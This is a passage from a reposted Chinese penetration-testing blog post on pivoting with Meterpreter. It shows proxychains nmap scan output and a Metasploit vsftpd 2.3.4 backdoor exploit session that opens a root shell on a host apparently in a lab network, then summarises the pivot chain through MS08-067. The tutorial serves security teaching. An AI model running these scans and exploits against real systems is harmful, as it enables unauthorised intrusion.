+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxychains nmap -sT -sV -p21,22,23,80 8.8.8.9 -n -Pn -vv</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">Starting Nmap 7.25BETA1 ( https://nmap.org )</span><br><span class="line">Nmap wishes you a merry Christmas! Specify -sX for Xmas Scan (https://nmap.org/book/man-port-scanning-techniques.html).</span><br><span class="line">NSE: Loaded 36 scripts for scanning.</span><br><span class="line">Initiating Connect Scan</span><br><span class="line">Scanning 8.8.8.9 [4 ports]</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:21-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Discovered open port 21/tcp on 8.8.8.9</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:23-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Discovered open port 23/tcp on 8.8.8.9</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Discovered open port 22/tcp on 8.8.8.9</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Discovered open port 80/tcp on 8.8.8.9</span><br><span class="line">Completed Connect Scan at 05:54, 1.37s elapsed (4 total ports)</span><br><span class="line">Initiating Service scan at 05:54</span><br><span class="line">Scanning 4 services on 8.8.8.9</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:21-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:23-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Completed Service scan at 05:54, 11.09s elapsed (4 services on 1 host)</span><br><span class="line">NSE: Script scanning 8.8.8.9.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:54</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Completed NSE at 05:54, 1.71s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:54</span><br><span class="line">Completed NSE at 05:54, 0.00s elapsed</span><br><span class="line">Nmap scan report for 8.8.8.9</span><br><span class="line">Host is up, received user-set (0.41s latency).</span><br><span class="line">Scanned</span><br><span class="line">PORT   STATE SERVICE REASON  VERSION</span><br><span class="line">21/tcp open  ftp     syn-ack vsftpd 2.3.4</span><br><span class="line">22/tcp open  ssh     syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">23/tcp open  telnet  syn-ack Linux telnetd</span><br><span class="line">80/tcp open  http    syn-ack Apache httpd 2.2.8 ((Ubuntu) DAV/2)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></tbody></table></figure>
+
+<p>以上，数据包穿透第一层代理服务器，又经过我们定义的第二层代理服务器，最终到达目的地。对扫描结果进行分析，发现8.8.8.9上安装的vsftpd版本存在漏洞。以下步骤为在Metasploit框架中设置vsftpd利用模块进行攻击：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">msf &gt;</span><br><span class="line">msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">msf exploit(vsftpd_234_backdoor) &gt; show options</span><br><span class="line">Module options (exploit/unix/ftp/vsftpd_234_backdoor):</span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   RHOST                   yes       The target address</span><br><span class="line">   RPORT  21               yes       The target port</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">msf exploit(vsftpd_234_backdoor) &gt; set rhost 8.8.8.9</span><br><span class="line">rhost =&gt; 8.8.8.9</span><br><span class="line">msf exploit(vsftpd_234_backdoor) &gt; run</span><br><span class="line">[*] 8.8.8.9:21 - Banner: 220 (vsFTPd 2.3.4)</span><br><span class="line">[*] 8.8.8.9:21 - USER: 331 Please specify the password.</span><br><span class="line">[+] 8.8.8.9:21 - Backdoor service has been spawned, handling...</span><br><span class="line">[+] 8.8.8.9:21 - UID: uid=0(root) gid=0(root)</span><br><span class="line">[*] Found shell.</span><br><span class="line">[*] Command shell session 4 opened (Local Pipe -&gt; Remote Pipe)</span><br><span class="line">pwd</span><br><span class="line">/</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 08:00:27:56:f1:7c  </span><br><span class="line">          inet addr:8.8.8.9  Bcast:8.8.8.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::a00:27ff:fe56:f17c/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:10843 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2779 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:1081842 (1.0 MB)  TX bytes:661455 (645.9 KB)</span><br><span class="line">          Base address:0xd010 Memory:f0000000-f0020000</span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:18161 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:18161 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:5307479 (5.0 MB)  TX bytes:5307479 (5.0 MB)</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>攻击者通过以下步骤，发现了2个不同的隐藏网络：</p>
+<p>1.攻击者控制了RD主机，该主机和攻击机在同一个网络中</p>
+<p>2.得知RD主机有2张网卡</p>
+<p>3.通过使用autoroute post模块，定义一个路由规则</p>
+<p>4.攻击者对7.7.7.0/24网络执行ARP和NMAP扫描，之后发现了命名为JC的主机</p>
+<p>5.JC存在两个不同的漏洞，分别为MS08_067和Easy File Share应用的BOF漏洞</p>
+<p>6.成功利用MS08_067漏洞，获取7.7.7.20访问</p>
+<p>7.继续收集信息，发现JC也有2张网卡</p>
+<p>8.在7.7.7.20上添加第二个路由规则</p>
+<p>9.对8.8.8.0/24网络执行ARP和NMAP扫描</p>
+<p>10.在命名为SK的8.8.8.9机器上发现存在漏洞的vsftp版本</p>
+<p>11.结束</p>
+<p><img src="https://b3logfile.com/file/2020/05/solofetchupload576147809014467733-b89006f7.jpeg" alt=""></p>
+<!--
+<div class="poem-wrap">
+  <div class="poem-border poem-left"></div>
+  <div class="poem-border poem-right"></div>
+    <h1>念两句诗</h1>
+    <p id="poem">挑选中...</p>
+    <p id="info">
+
+  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+  <script type="text/javascript">
+    jinrishici.load(function(result) {
+      poem.innerHTML = result.data.content
+      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
+      document.getElementById("poem").value(poem);
+      document.getElementById("info").value(info);  
+  });
+  </script>
+</div>
+-->
+
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script></span>
+      
+    </div>
+
+    <div> <div>
+ 
+<div style="text-align:center;color:#bfbfbf;font-size:16px;"> 
+<span>-------- 本文结束 </span> 
+<i class="fa fa-paw"></i> 
+<span> 感谢阅读 --------
+</span> 
+</div> 
+
+</div>
+ </div>
+    <div>
+        
+            
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+
+  <p><span>本文标题:</span>图解Meterpreter实现网络穿透的方法（转载）</a></p>
+  <p><span>文章作者:</span>FunctFan</a></p>
+  <p><span>发布时间:</span>2020年07月28日 - 04:27:35</p>
+  <p><span>最后更新:</span>2020年07月28日 - 04:32:01</p>
+  <p><span>原始链接:</span><a href="/posts/552008504/" title="图解Meterpreter实现网络穿透的方法（转载）">https://functfan.github.io/posts/552008504/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://functfan.github.io/posts/552008504/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({   
+          title: "",   
+          text: '复制成功',   
+          html: false,
+          timer: 500,   
+          showConfirmButton: false
+        });
+      });
+    }));  
+</script>
+
+
+        
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/" rel="tag"><i class="fa fa-tag"></i>技术基础</a>
+          
+            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="fa fa-tag"></i>渗透测试</a>
+          
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E7%A9%BF%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i>网络穿透</a>
+          
+            <a href="/tags/%E9%80%8F%E8%A7%86%E6%94%BB%E5%87%BB/" rel="tag"><i class="fa fa-tag"></i>透视攻击</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/1312971051/" rel="prev">
+                <i class="fa fa-chevron-left"></i> Java反序列化之CommonsBeanUtils 分析（转载）
+              </a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/2639883394/" rel="next">
+                使用Burp插件Java-Deserialization-Scanner检测java反序列化漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+          </div>
+        
+      
+
+        
+          
+  
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+      
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview" sidebar-panel >
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/timg_wps.png" alt="FunctFan" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">FunctFan</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description"> 90后无名小黑 | 北京工业大学</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">26</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            <a href="/categories">
+              <span class="site-state-item-count">9</span>
+              <span class="site-state-item-name">分类</span>
+              </a>
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">49</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://blog.csdn.net/RisingFan" target="_blank">
+                  <i class="fa fa-csdn"></i> CSDN
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://functfan.gitbook.io/" target="_blank">
+                  <i class="fa fa-gitbook"></i> GitBook
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://bleke.top/" target="_blank">
+                  <i class="fa fa-personpage"></i> PersonPage
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+	<div style="">
+  <canvas id="canvas" style="width:60%;">当前浏览器不支持canvas，请更换浏览器后再试</canvas>
+</div>
+<script>
+(function(){
+
+   var digit=
+    [
+        [
+            [0,0,1,1,1,0,0],
+            [0,1,1,0,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,0,1,1,0],
+            [0,0,1,1,1,0,0]
+        ],//0
+        [
+            [0,0,0,1,1,0,0],
+            [0,1,1,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [1,1,1,1,1,1,1]
+        ],//1
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,0,0,0],
+            [0,1,1,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,0,0,0,1,1],
+            [1,1,1,1,1,1,1]
+        ],//2
+        [
+            [1,1,1,1,1,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//3
+        [
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,1,0],
+            [0,0,1,1,1,1,0],
+            [0,1,1,0,1,1,0],
+            [1,1,0,0,1,1,0],
+            [1,1,1,1,1,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,1,1]
+        ],//4
+        [
+            [1,1,1,1,1,1,1],
+            [1,1,0,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,1,1,1,1,0],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//5
+        [
+            [0,0,0,0,1,1,0],
+            [0,0,1,1,0,0,0],
+            [0,1,1,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,0,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//6
+        [
+            [1,1,1,1,1,1,1],
+            [1,1,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0]
+        ],//7
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//8
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,1,1,0,0,0,0]
+        ],//9
+        [
+            [0,0,0,0,0,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,0,0,0],
+            [0,0,0,0,0,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,0,0,0]
+        ]//:
+    ];
+
+var canvas = document.getElementById('canvas');
+
+if(canvas.getContext){
+    var cxt = canvas.getContext('2d');
+    //声明canvas的宽高
+    var H = 100,W = 700;
+    canvas.height = H;
+    canvas.width = W;
+    cxt.fillStyle = '#555555';
+    cxt.fillRect(10,10,50,50);
+
+    //存储时间数据
+    var data = [];
+    //存储运动的小球
+    var balls = [];
+    //设置粒子半径
+    var R = canvas.height/20-1;
+    (function(){
+        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
+        //存储时间数字，由十位小时、个位小时、冒号、十位分钟、个位分钟、冒号、十位秒钟、个位秒钟这7个数字组成
+        data.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
+    })();
+
+    /*生成点阵数字*/
+    function renderDigit(index,num){
+        for(var i = 0; i < digit[num].length; i++){
+            for(var j = 0; j < digit[num][i].length; j++){
+                if(digit[num][i][j] == 1){
+                    cxt.beginPath();
+                    cxt.arc(14*(R+2)*index + j*2*(R+1)+(R+1),i*2*(R+1)+(R+1),R,0,2*Math.PI);
+                    cxt.closePath();
+                    cxt.fill();
+                }
+            }
+        }
+    }
+
+    /*更新时钟*/
+    function updateDigitTime(){
+        var changeNumArray = [];
+        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
+        var NewData = [];
+        NewData.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
+        for(var i = data.length-1; i >=0 ; i--){
+            //时间发生变化
+            if(NewData[i] !== data[i]){
+                //将变化的数字值和在data数组中的索引存储在changeNumArray数组中
+                changeNumArray.push(i+'_'+(Number(data[i])+1)%10);
+            }
+        }
+        //增加小球
+        for(var i = 0; i< changeNumArray.length; i++){
+            addBalls.apply(this,changeNumArray[i].split('_'));
+        }
+        data = NewData.concat();
+    }
+
+    /*更新小球状态*/
+    function updateBalls(){
+        for(var i = 0; i < balls.length; i++){
+            balls[i].stepY += balls[i].disY;
+            balls[i].x += balls[i].stepX;
+            balls[i].y += balls[i].stepY;
+            if(balls[i].x > W + R || balls[i].y > H + R){
+                balls.splice(i,1);
+                i--;
+            }
+        }
+    }
+
+    /*增加要运动的小球*/
+    function addBalls(index,num){
+        var numArray = [1,2,3];
+        var colorArray =  ["#3BE","#09C","#A6C","#93C","#9C0","#690","#FB3","#F80","#F44","#C00"];
+        for(var i = 0; i < digit[num].length; i++){
+            for(var j = 0; j < digit[num][i].length; j++){
+                if(digit[num][i][j] == 1){
+                    var ball = {
+                        x:14*(R+2)*index + j*2*(R+1)+(R+1),
+                        y:i*2*(R+1)+(R+1),
+                        stepX:Math.floor(Math.random() * 4 -2),
+                        stepY:-2*numArray[Math.floor(Math.random()*numArray.length)],
+                        color:colorArray[Math.floor(Math.random()*colorArray.length)],
+                        disY:1
+                    };
+                    balls.push(ball);
+                }
+            }
+        }
+    }
+
+    /*渲染*/
+    function render(){
+        //重置画布宽度，达到清空画布的效果
+        canvas.height = 100;
+        //渲染时钟
+        for(var i = 0; i < data.length; i++){
+            renderDigit(i,data[i]);
+        }
+        //渲染小球
+        for(var i = 0; i < balls.length; i++){
+            cxt.beginPath();
+            cxt.arc(balls[i].x,balls[i].y,R,0,2*Math.PI);
+            cxt.fillStyle = balls[i].color;
+            cxt.closePath();
+            cxt.fill();
+        }
+    }
+
+    clearInterval(oTimer);
+    var oTimer = setInterval(function(){
+        //更新时钟
+        updateDigitTime();
+        //更新小球状态
+        updateBalls();
+        //渲染
+        render();
+    },50);
+}
+
+})();
+</script>
+
+
+	
+	<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+	<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+	<div class="widget-wrap">
+	    
+	    <div id="myCanvasContainer" class="widget tagcloud">
+	        <canvas width="240" height="240" id="resCanvas" style="width=100%">
+	            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/2019CTF/" rel="tag">2019CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2020%E5%B9%B44%E6%9C%884%E6%97%A5/" rel="tag">2020年4月4日</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ACM%E7%AE%97%E6%B3%95/" rel="tag">ACM算法</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ApacheDubbo/" rel="tag">ApacheDubbo</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bjut-Search2016/" rel="tag">Bjut_Search2016</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-4852-Weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">CVE-2015-4852,Weblogic,反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2020-2023-2024-2025-2026/" rel="tag">CVE-2020-2023/2024/2025/2026</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Codeforces164/" rel="tag">Codeforces164</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CommonsBeanUtils/" rel="tag">CommonsBeanUtils</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DefaultServletm/" rel="tag">DefaultServletm</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Gopher/" rel="tag">Gopher</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java%E5%9F%BA%E7%A1%80/" rel="tag">Java基础</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JspServlet/" rel="tag">JspServlet</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KataContainers%E5%AE%B9%E5%99%A8/" rel="tag">KataContainers容器</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RMI/" rel="tag">RMI</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TPM%E6%90%AD%E5%BB%BA/" rel="tag">TPM搭建</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE%E6%BC%8F%E6%B4%9E/" rel="tag">XXE漏洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dc-1/" rel="tag">dc-1</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/h4x0r/" rel="tag">h4x0r</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">java反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/requestURI/" rel="tag">requestURI</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tomcat/" rel="tag">tomcat</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" 